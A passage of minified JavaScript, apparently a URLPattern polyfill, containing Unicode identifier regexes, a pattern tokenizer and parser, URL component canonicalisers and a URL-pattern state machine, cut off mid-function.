FFF]|\uD873[\uDC00-\uDEA1\uDEB0-\uDFFF]|\uD87A[\uDC00-\uDFE0]|\uD87E[\uDC00-\uDE1D]|\uD884[\uDC00-\uDF4A])/,C=/(?:[\$0-9A-Z_a-z\xAA\xB5\xB7\xBA\xC0-\xD6\xD8-\xF6\xF8-\u02C1\u02C6-\u02D1\u02E0-\u02E4\u02EC\u02EE\u0300-\u0374\u0376\u0377\u037A-\u037D\u037F\u0386-\u038A\u038C\u038E-\u03A1\u03A3-\u03F5\u03F7-\u0481\u0483-\u0487\u048A-\u052F\u0531-\u0556\u0559\u0560-\u0588\u0591-\u05BD\u05BF\u05C1\u05C2\u05C4\u05C5\u05C7\u05D0-\u05EA\u05EF-\u05F2\u0610-\u061A\u0620-\u0669\u066E-\u06D3\u06D5-\u06DC\u06DF-\u06E8\u06EA-\u06FC\u06FF\u0710-\u074A\u074D-\u07B1\u07C0-\u07F5\u07FA\u07FD\u0800-\u082D\u0840-\u085B\u0860-\u086A\u08A0-\u08B4\u08B6-\u08C7\u08D3-\u08E1\u08E3-\u0963\u0966-\u096F\u0971-\u0983\u0985-\u098C\u098F\u0990\u0993-\u09A8\u09AA-\u09B0\u09B2\u09B6-\u09B9\u09BC-\u09C4\u09C7\u09C8\u09CB-\u09CE\u09D7\u09DC\u09DD\u09DF-\u09E3\u09E6-\u09F1\u09FC\u09FE\u0A01-\u0A03\u0A05-\u0A0A\u0A0F\u0A10\u0A13-\u0A28\u0A2A-\u0A30\u0A32\u0A33\u0A35\u0A36\u0A38\u0A39\u0A3C\u0A3E-\u0A42\u0A47\u0A48\u0A4B-\u0A4D\u0A51\u0A59-\u0A5C\u0A5E\u0A66-\u0A75\u0A81-\u0A83\u0A85-\u0A8D\u0A8F-\u0A91\u0A93-\u0AA8\u0AAA-\u0AB0\u0AB2\u0AB3\u0AB5-\u0AB9\u0ABC-\u0AC5\u0AC7-\u0AC9\u0ACB-\u0ACD\u0AD0\u0AE0-\u0AE3\u0AE6-\u0AEF\u0AF9-\u0AFF\u0B01-\u0B03\u0B05-\u0B0C\u0B0F\u0B10\u0B13-\u0B28\u0B2A-\u0B30\u0B32\u0B33\u0B35-\u0B39\u0B3C-\u0B44\u0B47\u0B48\u0B4B-\u0B4D\u0B55-\u0B57\u0B5C\u0B5D\u0B5F-\u0B63\u0B66-\u0B6F\u0B71\u0B82\u0B83\u0B85-\u0B8A\u0B8E-\u0B90\u0B92-\u0B95\u0B99\u0B9A\u0B9C\u0B9E\u0B9F\u0BA3\u0BA4\u0BA8-\u0BAA\u0BAE-\u0BB9\u0BBE-\u0BC2\u0BC6-\u0BC8\u0BCA-\u0BCD\u0BD0\u0BD7\u0BE6-\u0BEF\u0C00-\u0C0C\u0C0E-\u0C10\u0C12-\u0C28\u0C2A-\u0C39\u0C3D-\u0C44\u0C46-\u0C48\u0C4A-\u0C4D\u0C55\u0C56\u0C58-\u0C5A\u0C60-\u0C63\u0C66-\u0C6F\u0C80-\u0C83\u0C85-\u0C8C\u0C8E-\u0C90\u0C92-\u0CA8\u0CAA-\u0CB3\u0CB5-\u0CB9\u0CBC-\u0CC4\u0CC6-\u0CC8\u0CCA-\u0CCD\u0CD5\u0CD6\u0CDE\u0CE0-\u0CE3\u0CE6-\u0CEF\u0CF1\u0CF2\u0D00-\u0D0C\u0D0E-\u0D10\u0D12-\u0D44\u0D46-\u0D48\u0D4A-\u0D4E\u0D54-\u0D57\u0D5F-\u0D63\u0D66-\u0D6F\u0D7A-\u0D7F\u0D81-\u0D83\u0D85-\u0D96\u0D9A-\u0DB1\u0DB3-\u0DBB\u0DBD\u0DC0-\u0DC6\u0DCA\u0DCF-\u0DD4\u0DD6\u0DD8-\u0DDF\u0DE6-\u0DEF\u0DF2\u0DF3\u0E01-\u0E3A\u0E40-\u0E4E\u0E50-\u0E59\u0E81\u0E82\u0E84\u0E86-\u0E8A\u0E8C-\u0EA3\u0EA5\u0EA7-\u0EBD\u0EC0-\u0EC4\u0EC6\u0EC8-\u0ECD\u0ED0-\u0ED9\u0EDC-\u0EDF\u0F00\u0F18\u0F19\u0F20-\u0F29\u0F35\u0F37\u0F39\u0F3E-\u0F47\u0F49-\u0F6C\u0F71-\u0F84\u0F86-\u0F97\u0F99-\u0FBC\u0FC6\u1000-\u1049\u1050-\u109D\u10A0-\u10C5\u10C7\u10CD\u10D0-\u10FA\u10FC-\u1248\u124A-\u124D\u1250-\u1256\u1258\u125A-\u125D\u1260-\u1288\u128A-\u128D\u1290-\u12B0\u12B2-\u12B5\u12B8-\u12BE\u12C0\u12C2-\u12C5\u12C8-\u12D6\u12D8-\u1310\u1312-\u1315\u1318-\u135A\u135D-\u135F\u1369-\u1371\u1380-\u138F\u13A0-\u13F5\u13F8-\u13FD\u1401-\u166C\u166F-\u167F\u1681-\u169A\u16A0-\u16EA\u16EE-\u16F8\u1700-\u170C\u170E-\u1714\u1720-\u1734\u1740-\u1753\u1760-\u176C\u176E-\u1770\u1772\u1773\u1780-\u17D3\u17D7\u17DC\u17DD\u17E0-\u17E9\u180B-\u180D\u1810-\u1819\u1820-\u1878\u1880-\u18AA\u18B0-\u18F5\u1900-\u191E\u1920-\u192B\u1930-\u193B\u1946-\u196D\u1970-\u1974\u1980-\u19AB\u19B0-\u19C9\u19D0-\u19DA\u1A00-\u1A1B\u1A20-\u1A5E\u1A60-\u1A7C\u1A7F-\u1A89\u1A90-\u1A99\u1AA7\u1AB0-\u1ABD\u1ABF\u1AC0\u1B00-\u1B4B\u1B50-\u1B59\u1B6B-\u1B73\u1B80-\u1BF3\u1C00-\u1C37\u1C40-\u1C49\u1C4D-\u1C7D\u1C80-\u1C88\u1C90-\u1CBA\u1CBD-\u1CBF\u1CD0-\u1CD2\u1CD4-\u1CFA\u1D00-\u1DF9\u1DFB-\u1F15\u1F18-\u1F1D\u1F20-\u1F45\u1F48-\u1F4D\u1F50-\u1F57\u1F59\u1F5B\u1F5D\u1F5F-\u1F7D\u1F80-\u1FB4\u1FB6-\u1FBC\u1FBE\u1FC2-\u1FC4\u1FC6-\u1FCC\u1FD0-\u1FD3\u1FD6-\u1FDB\u1FE0-\u1FEC\u1FF2-\u1FF4\u1FF6-\u1FFC\u200C\u200D\u203F\u2040\u2054\u2071\u207F\u2090-\u209C\u20D0-\u20DC\u20E1\u20E5-\u20F0\u2102\u2107\u210A-\u2113\u2115\u2118-\u211D\u2124\u2126\u2128\u212A-\u2139\u213C-\u213F\u2145-\u2149\u214E\u2160-\u2188\u2C00-\u2C2E\u2C30-\u2C5E\u2C60-\u2CE4\u2CEB-\u2CF3\u2D00-\u2D25\u2D27\u2D2D\u2D30-\u2D67\u2D6F\u2D7F-\u2D96\u2DA0-\u2DA6\u2DA8-\u2DAE\u2DB0-\u2DB6\u2DB8-\u2DBE\u2DC0-\u2DC6\u2DC8-\u2DCE\u2DD0-\u2DD6\u2DD8-\u2DDE\u2DE0-\u2DFF\u3005-\u3007\u3021-\u302F\u3031-\u3035\u3038-\u303C\u3041-\u3096\u3099-\u309F\u30A1-\u30FA\u30FC-\u30FF\u3105-\u312F\u3131-\u318E\u31A0-\u31BF\u31F0-\u31FF\u3400-\u4DBF\u4E00-\u9FFC\uA000-\uA48C\uA4D0-\uA4FD\uA500-\uA60C\uA610-\uA62B\uA640-\uA66F\uA674-\uA67D\uA67F-\uA6F1\uA717-\uA71F\uA722-\uA788\uA78B-\uA7BF\uA7C2-\uA7CA\uA7F5-\uA827\uA82C\uA840-\uA873\uA880-\uA8C5\uA8D0-\uA8D9\uA8E0-\uA8F7\uA8FB\uA8FD-\uA92D\uA930-\uA953\uA960-\uA97C\uA980-\uA9C0\uA9CF-\uA9D9\uA9E0-\uA9FE\uAA00-\uAA36\uAA40-\uAA4D\uAA50-\uAA59\uAA60-\uAA76\uAA7A-\uAAC2\uAADB-\uAADD\uAAE0-\uAAEF\uAAF2-\uAAF6\uAB01-\uAB06\uAB09-\uAB0E\uAB11-\uAB16\uAB20-\uAB26\uAB28-\uAB2E\uAB30-\uAB5A\uAB5C-\uAB69\uAB70-\uABEA\uABEC\uABED\uABF0-\uABF9\uAC00-\uD7A3\uD7B0-\uD7C6\uD7CB-\uD7FB\uF900-\uFA6D\uFA70-\uFAD9\uFB00-\uFB06\uFB13-\uFB17\uFB1D-\uFB28\uFB2A-\uFB36\uFB38-\uFB3C\uFB3E\uFB40\uFB41\uFB43\uFB44\uFB46-\uFBB1\uFBD3-\uFD3D\uFD50-\uFD8F\uFD92-\uFDC7\uFDF0-\uFDFB\uFE00-\uFE0F\uFE20-\uFE2F\uFE33\uFE34\uFE4D-\uFE4F\uFE70-\uFE74\uFE76-\uFEFC\uFF10-\uFF19\uFF21-\uFF3A\uFF3F\uFF41-\uFF5A\uFF66-\uFFBE\uFFC2-\uFFC7\uFFCA-\uFFCF\uFFD2-\uFFD7\uFFDA-\uFFDC]|\uD800[\uDC00-\uDC0B\uDC0D-\uDC26\uDC28-\uDC3A\uDC3C\uDC3D\uDC3F-\uDC4D\uDC50-\uDC5D\uDC80-\uDCFA\uDD40-\uDD74\uDDFD\uDE80-\uDE9C\uDEA0-\uDED0\uDEE0\uDF00-\uDF1F\uDF2D-\uDF4A\uDF50-\uDF7A\uDF80-\uDF9D\uDFA0-\uDFC3\uDFC8-\uDFCF\uDFD1-\uDFD5]|\uD801[\uDC00-\uDC9D\uDCA0-\uDCA9\uDCB0-\uDCD3\uDCD8-\uDCFB\uDD00-\uDD27\uDD30-\uDD63\uDE00-\uDF36\uDF40-\uDF55\uDF60-\uDF67]|\uD802[\uDC00-\uDC05\uDC08\uDC0A-\uDC35\uDC37\uDC38\uDC3C\uDC3F-\uDC55\uDC60-\uDC76\uDC80-\uDC9E\uDCE0-\uDCF2\uDCF4\uDCF5\uDD00-\uDD15\uDD20-\uDD39\uDD80-\uDDB7\uDDBE\uDDBF\uDE00-\uDE03\uDE05\uDE06\uDE0C-\uDE13\uDE15-\uDE17\uDE19-\uDE35\uDE38-\uDE3A\uDE3F\uDE60-\uDE7C\uDE80-\uDE9C\uDEC0-\uDEC7\uDEC9-\uDEE6\uDF00-\uDF35\uDF40-\uDF55\uDF60-\uDF72\uDF80-\uDF91]|\uD803[\uDC00-\uDC48\uDC80-\uDCB2\uDCC0-\uDCF2\uDD00-\uDD27\uDD30-\uDD39\uDE80-\uDEA9\uDEAB\uDEAC\uDEB0\uDEB1\uDF00-\uDF1C\uDF27\uDF30-\uDF50\uDFB0-\uDFC4\uDFE0-\uDFF6]|\uD804[\uDC00-\uDC46\uDC66-\uDC6F\uDC7F-\uDCBA\uDCD0-\uDCE8\uDCF0-\uDCF9\uDD00-\uDD34\uDD36-\uDD3F\uDD44-\uDD47\uDD50-\uDD73\uDD76\uDD80-\uDDC4\uDDC9-\uDDCC\uDDCE-\uDDDA\uDDDC\uDE00-\uDE11\uDE13-\uDE37\uDE3E\uDE80-\uDE86\uDE88\uDE8A-\uDE8D\uDE8F-\uDE9D\uDE9F-\uDEA8\uDEB0-\uDEEA\uDEF0-\uDEF9\uDF00-\uDF03\uDF05-\uDF0C\uDF0F\uDF10\uDF13-\uDF28\uDF2A-\uDF30\uDF32\uDF33\uDF35-\uDF39\uDF3B-\uDF44\uDF47\uDF48\uDF4B-\uDF4D\uDF50\uDF57\uDF5D-\uDF63\uDF66-\uDF6C\uDF70-\uDF74]|\uD805[\uDC00-\uDC4A\uDC50-\uDC59\uDC5E-\uDC61\uDC80-\uDCC5\uDCC7\uDCD0-\uDCD9\uDD80-\uDDB5\uDDB8-\uDDC0\uDDD8-\uDDDD\uDE00-\uDE40\uDE44\uDE50-\uDE59\uDE80-\uDEB8\uDEC0-\uDEC9\uDF00-\uDF1A\uDF1D-\uDF2B\uDF30-\uDF39]|\uD806[\uDC00-\uDC3A\uDCA0-\uDCE9\uDCFF-\uDD06\uDD09\uDD0C-\uDD13\uDD15\uDD16\uDD18-\uDD35\uDD37\uDD38\uDD3B-\uDD43\uDD50-\uDD59\uDDA0-\uDDA7\uDDAA-\uDDD7\uDDDA-\uDDE1\uDDE3\uDDE4\uDE00-\uDE3E\uDE47\uDE50-\uDE99\uDE9D\uDEC0-\uDEF8]|\uD807[\uDC00-\uDC08\uDC0A-\uDC36\uDC38-\uDC40\uDC50-\uDC59\uDC72-\uDC8F\uDC92-\uDCA7\uDCA9-\uDCB6\uDD00-\uDD06\uDD08\uDD09\uDD0B-\uDD36\uDD3A\uDD3C\uDD3D\uDD3F-\uDD47\uDD50-\uDD59\uDD60-\uDD65\uDD67\uDD68\uDD6A-\uDD8E\uDD90\uDD91\uDD93-\uDD98\uDDA0-\uDDA9\uDEE0-\uDEF6\uDFB0]|\uD808[\uDC00-\uDF99]|\uD809[\uDC00-\uDC6E\uDC80-\uDD43]|[\uD80C\uD81C-\uD820\uD822\uD840-\uD868\uD86A-\uD86C\uD86F-\uD872\uD874-\uD879\uD880-\uD883][\uDC00-\uDFFF]|\uD80D[\uDC00-\uDC2E]|\uD811[\uDC00-\uDE46]|\uD81A[\uDC00-\uDE38\uDE40-\uDE5E\uDE60-\uDE69\uDED0-\uDEED\uDEF0-\uDEF4\uDF00-\uDF36\uDF40-\uDF43\uDF50-\uDF59\uDF63-\uDF77\uDF7D-\uDF8F]|\uD81B[\uDE40-\uDE7F\uDF00-\uDF4A\uDF4F-\uDF87\uDF8F-\uDF9F\uDFE0\uDFE1\uDFE3\uDFE4\uDFF0\uDFF1]|\uD821[\uDC00-\uDFF7]|\uD823[\uDC00-\uDCD5\uDD00-\uDD08]|\uD82C[\uDC00-\uDD1E\uDD50-\uDD52\uDD64-\uDD67\uDD70-\uDEFB]|\uD82F[\uDC00-\uDC6A\uDC70-\uDC7C\uDC80-\uDC88\uDC90-\uDC99\uDC9D\uDC9E]|\uD834[\uDD65-\uDD69\uDD6D-\uDD72\uDD7B-\uDD82\uDD85-\uDD8B\uDDAA-\uDDAD\uDE42-\uDE44]|\uD835[\uDC00-\uDC54\uDC56-\uDC9C\uDC9E\uDC9F\uDCA2\uDCA5\uDCA6\uDCA9-\uDCAC\uDCAE-\uDCB9\uDCBB\uDCBD-\uDCC3\uDCC5-\uDD05\uDD07-\uDD0A\uDD0D-\uDD14\uDD16-\uDD1C\uDD1E-\uDD39\uDD3B-\uDD3E\uDD40-\uDD44\uDD46\uDD4A-\uDD50\uDD52-\uDEA5\uDEA8-\uDEC0\uDEC2-\uDEDA\uDEDC-\uDEFA\uDEFC-\uDF14\uDF16-\uDF34\uDF36-\uDF4E\uDF50-\uDF6E\uDF70-\uDF88\uDF8A-\uDFA8\uDFAA-\uDFC2\uDFC4-\uDFCB\uDFCE-\uDFFF]|\uD836[\uDE00-\uDE36\uDE3B-\uDE6C\uDE75\uDE84\uDE9B-\uDE9F\uDEA1-\uDEAF]|\uD838[\uDC00-\uDC06\uDC08-\uDC18\uDC1B-\uDC21\uDC23\uDC24\uDC26-\uDC2A\uDD00-\uDD2C\uDD30-\uDD3D\uDD40-\uDD49\uDD4E\uDEC0-\uDEF9]|\uD83A[\uDC00-\uDCC4\uDCD0-\uDCD6\uDD00-\uDD4B\uDD50-\uDD59]|\uD83B[\uDE00-\uDE03\uDE05-\uDE1F\uDE21\uDE22\uDE24\uDE27\uDE29-\uDE32\uDE34-\uDE37\uDE39\uDE3B\uDE42\uDE47\uDE49\uDE4B\uDE4D-\uDE4F\uDE51\uDE52\uDE54\uDE57\uDE59\uDE5B\uDE5D\uDE5F\uDE61\uDE62\uDE64\uDE67-\uDE6A\uDE6C-\uDE72\uDE74-\uDE77\uDE79-\uDE7C\uDE7E\uDE80-\uDE89\uDE8B-\uDE9B\uDEA1-\uDEA3\uDEA5-\uDEA9\uDEAB-\uDEBB]|\uD83E[\uDFF0-\uDFF9]|\uD869[\uDC00-\uDEDD\uDF00-\uDFFF]|\uD86D[\uDC00-\uDF34\uDF40-\uDFFF]|\uD86E[\uDC00-\uDC1D\uDC20-\uDFFF]|\uD873[\uDC00-\uDEA1\uDEB0-\uDFFF]|\uD87A[\uDC00-\uDFE0]|\uD87E[\uDC00-\uDE1D]|\uD884[\uDC00-\uDF4A]|\uDB40[\uDD00-\uDDEF])/;function A(u,D){return (D?/^[\x00-\xFF]*$/:/^[\x00-\x7F]*$/).test(u)}function E(u,D){void 0===D&&(D=!1);for(var t=[],F=0;F<u.length;){var E=u[F],n=function(e){if(!D)throw new TypeError(e);t.push({type:"INVALID_CHAR",index:F,value:u[F++]});};if("*"!==E)if("+"!==E&&"?"!==E)if("\\"!==E)if("{"!==E)if("}"!==E)if(":"!==E)if("("!==E)t.push({type:"CHAR",index:F,value:u[F++]});else {var r=1,i="",s=F+1,a=!1;if("?"===u[s]){n('Pattern cannot start with "?" at '+s);continue}for(;s<u.length;){if(!A(u[s],!1)){n("Invalid character '"+u[s]+"' at "+s+"."),a=!0;break}if("\\"!==u[s]){if(")"===u[s]){if(0==--r){s++;break}}else if("("===u[s]&&(r++,"?"!==u[s+1])){n("Capturing groups are not allowed at "+s),a=!0;break}i+=u[s++];}else i+=u[s++]+u[s++];}if(a)continue;if(r){n("Unbalanced pattern at "+F);continue}if(!i){n("Missing pattern at "+F);continue}t.push({type:"PATTERN",index:F,value:i}),F=s;}else {for(var B="",o=F+1;o<u.length;){var h=u.substr(o,1);if(!(o===F+1&&e.test(h)||o!==F+1&&C.test(h)))break;B+=u[o++];}if(!B){n("Missing parameter name at "+F);continue}t.push({type:"NAME",index:F,value:B}),F=o;}else t.push({type:"CLOSE",index:F,value:u[F++]});else t.push({type:"OPEN",index:F,value:u[F++]});else t.push({type:"ESCAPED_CHAR",index:F++,value:u[F++]});else t.push({type:"MODIFIER",index:F,value:u[F++]});else t.push({type:"ASTERISK",index:F,value:u[F++]});}return t.push({type:"END",index:F,value:""}),t}function n(u,D){void 0===D&&(D={});for(var t=E(u),F=D.prefixes,e=void 0===F?"./":F,C="[^"+r(D.delimiter||"/#?")+"]+?",A=[],n=0,i=0,s="",a=new Set,B=function(u){if(i<t.length&&t[i].type===u)return t[i++].value},o=function(){return B("MODIFIER")||B("ASTERISK")},h=function(u){var D=B(u);if(void 0!==D)return D;var F=t[i];throw new TypeError("Unexpected "+F.type+" at "+F.index+", expected "+u)},p=function(){for(var u,D="";u=B("CHAR")||B("ESCAPED_CHAR");)D+=u;return D},c=D.encodePart||function(u){return u};i<t.length;){var f=B("CHAR"),l=B("NAME"),m=B("PATTERN");if(l||m||!B("ASTERISK")||(m=".*"),l||m){var d=f||"";-1===e.indexOf(d)&&(s+=d,d=""),s&&(A.push(c(s)),s="");var g=l||n++;if(a.has(g))throw new TypeError("Duplicate name '"+g+"'.");a.add(g),A.push({name:g,prefix:c(d),suffix:"",pattern:m||C,modifier:o()||""});}else {var x=f||B("ESCAPED_CHAR");if(x)s+=x;else if(B("OPEN")){var S=p(),v=B("NAME")||"",y=B("PATTERN")||"";v||y||!B("ASTERISK")||(y=".*");var R=p();h("CLOSE");var k=o()||"";if(!v&&!y&&!k){s+=S;continue}if(!v&&!y&&!S)continue;s&&(A.push(c(s)),s=""),A.push({name:v||(y?n++:""),pattern:v&&!y?C:y,prefix:c(S),suffix:c(R),modifier:k});}else s&&(A.push(c(s)),s=""),h("END");}}return A}function r(u){return u.replace(/([.+*?^${}()[\]|/\\])/g,"\\$1")}function i(u){return u&&u.sensitive?"u":"ui"}function s(u,D,t){void 0===t&&(t={});for(var e,C=t.strict,A=void 0!==C&&C,E=t.start,n=void 0===E||E,s=t.end,a=void 0===s||s,B=t.encode,o=void 0===B?function(u){return u}:B,h="["+r(t.endsWith||"")+"]|$",p="["+r(t.delimiter||"/#?")+"]",c=n?"^":"",f=F(u);!(e=f()).done;){var l=e.value;if("string"==typeof l)c+=r(o(l));else {var m=r(o(l.prefix)),d=r(o(l.suffix));l.pattern?(D&&D.push(l),c+=m||d?"+"===l.modifier||"*"===l.modifier?"(?:"+m+"((?:"+l.pattern+")(?:"+d+m+"(?:"+l.pattern+"))*)"+d+")"+("*"===l.modifier?"?":""):"(?:"+m+"("+l.pattern+")"+d+")"+l.modifier:"+"===l.modifier||"*"===l.modifier?"((?:"+l.pattern+")"+l.modifier+")":"("+l.pattern+")"+l.modifier):c+="(?:"+m+d+")"+l.modifier;}}if(a)A||(c+=p+"?"),c+=t.endsWith?"(?="+h+")":"$";else {var g=u[u.length-1],x="string"==typeof g?p.indexOf(g[g.length-1])>-1:void 0===g;A||(c+="(?:"+p+"(?="+h+"))?"),x||(c+="(?="+p+"|"+h+")");}return new RegExp(c,i(t))}function a(u,D,t){return u instanceof RegExp?function(u,D){if(!D)return u;for(var t=/\((?:\?<(.*?)>)?(?!\?)/g,F=0,e=t.exec(u.source);e;)D.push({name:e[1]||F++,prefix:"",suffix:"",modifier:"",pattern:""}),e=t.exec(u.source);return u}(u,D):Array.isArray(u)?function(u,D,t){var F=u.map(function(u){return a(u,D,t).source});return new RegExp("(?:"+F.join("|")+")",i(t))}(u,D,t):function(u,D,t){return s(n(u,t),D,t)}(u,D,t)}var B={delimiter:"",prefixes:"",sensitive:!0,strict:!0},o={delimiter:".",prefixes:"",sensitive:!0,strict:!0},h={delimiter:"/",prefixes:"/",sensitive:!0,strict:!0};function p(u,D){return u.startsWith(D)?u.substring(D.length,u.length):u}function c(u){return !(!u||u.length<2||"["!==u[0]&&("\\"!==u[0]&&"{"!==u[0]||"["!==u[1]))}var f,l=["ftp","file","http","https","ws","wss"];function m(u){if(!u)return !0;for(var D,t=F(l);!(D=t()).done;)if(u.test(D.value))return !0;return !1}function d(u){switch(u){case"ws":case"http":return "80";case"wws":case"https":return "443";case"ftp":return "21";default:return ""}}function g(u){if(""===u)return u;if(/^[-+.A-Za-z0-9]*$/.test(u))return u.toLowerCase();throw new TypeError("Invalid protocol '"+u+"'.")}function x(u){if(""===u)return u;var D=new URL("https://example.com");return D.username=u,D.username}function S(u){if(""===u)return u;var D=new URL("https://example.com");return D.password=u,D.password}function v(u){if(""===u)return u;if(/[\t\n\r #%/:<>?@[\]^\\|]/g.test(u))throw new TypeError("Invalid hostname '"+u+"'");var D=new URL("https://example.com");return D.hostname=u,D.hostname}function y(u){if(""===u)return u;if(/[^0-9a-fA-F[\]:]/g.test(u))throw new TypeError("Invalid IPv6 hostname '"+u+"'");return u.toLowerCase()}function R(u){if(""===u)return u;if(/^[0-9]*$/.test(u)&&parseInt(u)<=65535)return u;throw new TypeError("Invalid port '"+u+"'.")}function k(u){if(""===u)return u;var D=new URL("https://example.com");return D.pathname="/"!==u[0]?"/-"+u:u,"/"!==u[0]?D.pathname.substring(2,D.pathname.length):D.pathname}function w(u){return ""===u?u:new URL("data:"+u).pathname}function P(u){if(""===u)return u;var D=new URL("https://example.com");return D.search=u,D.search.substring(1,D.search.length)}function T(u){if(""===u)return u;var D=new URL("https://example.com");return D.hash=u,D.hash.substring(1,D.hash.length)}!function(u){u[u.INIT=0]="INIT",u[u.PROTOCOL=1]="PROTOCOL",u[u.AUTHORITY=2]="AUTHORITY",u[u.USERNAME=3]="USERNAME",u[u.PASSWORD=4]="PASSWORD",u[u.HOSTNAME=5]="HOSTNAME",u[u.PORT=6]="PORT",u[u.PATHNAME=7]="PATHNAME",u[u.SEARCH=8]="SEARCH",u[u.HASH=9]="HASH",u[u.DONE=10]="DONE";}(f||(f={}));var b=function(){function u(u){this.input=void 0,this.tokenList=[],this.internalResult={},this.tokenIndex=0,this.tokenIncrement=1,this.componentStart=0,this.state=f.INIT,this.groupDepth=0,this.hostnameIPv6BracketDepth=0,this.shouldTreatAsStandardURL=!1,this.input=u;}var t=u.prototype;return t.parse=function(){for(this.tokenList=E(this.input,!0);this.tokenIndex<this.tokenList.length;this.tokenIndex+=this.tokenIncrement){if(this.tokenIncrement=1,"END"===this.tokenList[this.tokenIndex].type){if(this.state===f.INIT){this.rewind(),this.isHashPrefix()?this.changeState(f.HASH,1):this.isSearchPrefix()?(this.changeState(f.SEARCH,1),this.internalResult.hash=""):(this.changeState(f.PATHNAME,0),this.internalResult.search="",this.internalResult.hash="");continue}if(this.state===f.AUTHORITY){this.rewindAndSetState(f.HOSTNAME);continue}this.changeState(f.DONE,0);break}if(this.groupDepth>0){if(!this.isGroupClose())continue;this.groupDepth-=1;}if(this.isGroupOpen())this.groupDepth+=1;else switch(this.state){case f.INIT:this.isProtocolSuffix()&&(this.internalResult.username="",this.internalResult.password="",this.internalResult.hostname="",this.internalResult.port="",this.internalResult.pathname="",this.internalResult.search="",this.internalResult.hash="",this.rewindAndSetState(f.PROTOCOL));break;case f.PROTOCOL:if(this.isProtocolSuffix()){this.computeShouldTreatAsStandardURL();var u=f.PATHNAME,D=1;this.shouldTreatAsStandardURL&&(this.internalResult.pathname="/"),this.nextIsAuthoritySlashes()?(u=f.AUTHORITY,D=3):this.shouldTreatAsStandardURL&&(u=f.AUTHORITY),this.changeState(u,D);}break;case f.AUTHORITY:this.isIdentityTerminator()?this.rewindAndSetState(f.USERNAME):(this.isPathnameStart()||this.isSearchPrefix()||this.isHashPrefix())&&this.rewindAndSetState(f.HOSTNAME);break;case f.USERNAME:this.isPasswordPrefix()?this.changeState(f.PASSWORD,1):this.isIdentityTerminator()&&this.changeState(f.HOSTNAME,1);break;case f.PASSWORD:this.isIdentityTerminator()&&this.changeState(f.HOSTNAME,1);break;case f.HOSTNAME:this.isIPv6Open()?this.hostnameIPv6BracketDepth+=1:this.isIPv6Close()&&(this.hostnameIPv6BracketDepth-=1),this.isPortPrefix()&&!this.hostnameIPv6BracketDepth?this.changeState(f.PORT,1):this.isPathnameStart()?this.changeState(f.PATHNAME,0):this.isSearchPrefix()?this.changeState(f.SEARCH,1):this.isHashPrefix()&&this.changeState(f.HASH,1);break;case f.PORT:this.isPathnameStart()?this.changeState(f.PATHNAME,0):this.isSearchPrefix()?this.changeState(f.SEARCH,1):this.isHashPrefix()&&this.changeState(f.HASH,1);break;case f.PATHNAME:this.isSearchPrefix()?this.changeState(f.SEARCH,1):this.isHashPrefix()&&this.changeState(f.HASH,1);break;case f.SEARCH:this.isHashPrefix()&&this.changeState(f.HASH,1);}}},t.changeState=function(u,D){switch(this.state){case f.INIT:break;case f.PROTOCOL:this.internalResult.protocol=this.makeComponentString();break;case f.AUTHORITY:break;case f.USERNAME:this.internalResult.username=this.makeComponentString();break;case f.PASSWORD:this.internalResult.password=this.makeComponentString();break;case f.HOSTNAME:this.internalResult.hostname=this.makeComponentString();break;case f.PORT:this.internalResult.port=this.makeComponentString();break;case f.PATHNAME:this.internalResult.pathname=this.makeComponentString();break;case f.SEARCH:this.internalResult.search=this.makeComponentString();break;case f.HASH:this.internalResult.hash=this.makeComponentString();}this.changeStateWithoutSettingComponent(u,D);},t.changeStateWithoutSettingComponent=function(u,D){this.state=u,this.componentStart=this.tokenIndex+D,this.tokenIndex+=D,this.tokenIncrement=0;},t.rewind=function(){this.tokenIndex=this.componentStart,this.tokenIncrement=0;},t.rewindAndSetState=function(u){this.rewind(),this.state=u;},t.safeToken=function(u){return u<0&&(u=this.tokenList.length-u),u<this.tokenList.length?this.tokenList[u]:this.tokenList[this.tokenList.length-1]},t.isNonSpecialPatternChar=function(u,D){var t=this.safeToken(u);return t.value===D&&("CHAR"===t.type||"ESCAPED_CHAR"===t.type||"INVALID_CHAR"===t.type)},t.isProtocolSuffix=function(){return this.isNonSpecialPatternChar(this.tokenIndex,":")},t.nextIsAuthoritySlashes=function(){return this.isNonSpecialPatternChar(this.tokenIndex+1,"/")&&this.isNonSpecialPatternChar(this.tokenIndex+2,"/")},t.isIdentityTerminator=function(){return this.isNonSpecialPatternChar(this.tokenIndex,"@")},t.isPasswordPrefix=function(){return this.isNonSpecialPatternChar(this.tokenIndex,":")},t.isPortPrefix=function(){return this.isNonSpecialPatternChar(this.tokenIndex,":")},t.isPathnameStart=function(){return this.isNonSpecialPatternChar(this.tokenIndex,"/")},t.isSearchPrefix=function(){if(this.isNonSpecialPatternChar(this.tokenIndex,"?"))return !0;if("?"!==this.tokenList[this.tokenIndex].value)return !1;var u=this.safeToken(this.tokenIndex-1);return "NAME"!==u.type&&"PATTERN"!==u.type&&"CLOSE"!==u.type&&"ASTERISK"!==u.type},t.isHashPrefix=function(){return this.isNonSpecialPatternChar(this.tokenIndex,"#")},t.isGroupOpen=function(){return "OPEN"==this.tokenList[this.tokenIndex].type},t.isGroupClose=function(){return "CLOSE"==this.tokenList[this.tokenIndex].type},t.isIPv6Open=function(){return this.isNonSpecialPatternChar(this.tokenIndex,"[")},t.isIPv6Close=function(){return this.isNonSpecialPatternChar(this.tokenIndex,"]")},t.makeComponentString=function(){var u=this.tokenList[this.tokenIndex],D=this.safeToken(this.componentStart).index;return this.input.substring(D,u.index)},t.computeShouldTreatAsStandardURL=function(){var u={};Object.assign(u,B),u.encodePart=g;var D=a(this.makeComponentString(),void 0,u);this.shouldTreatAsStandardURL=m(D);},D(u,[{key:"result",get:function(){return this.internalResult}}]),u}(),I=["protocol","username","password","hostname","port","pathname","search","hash"];function O(u,D){if("string"!=typeof u)throw new TypeError("parameter 1 is not of type 'string'.");var t=new URL(u,D);return {protocol:t.protocol.substring(0,t.protocol.length-1),username:t.username,password:t.password,hostname:t.hostname,port:t.port,pathname:t.pathname,search:""!=t.search?t.search.substring(1,t.search.length):void 0,hash:""!=t.hash?t.hash.substring(1,t.hash.length):void 0}}function H(u,D,t){var F;if("string"==typeof D.baseURL)try{F=new URL(D.baseURL),u.protocol=F.protocol?F.protocol.substring(0,F.protocol.length-1):"",u.username=F.username,u.password=F.password,u.hostname=F.hostname,u.port=F.port,u.pathname=F.pathname,u.search=F.search?F.search.substring(1,F.search.length):"",u.hash=F.hash?F.hash.substring(1,F.hash.length):"";}catch(u){throw new TypeError("invalid baseURL 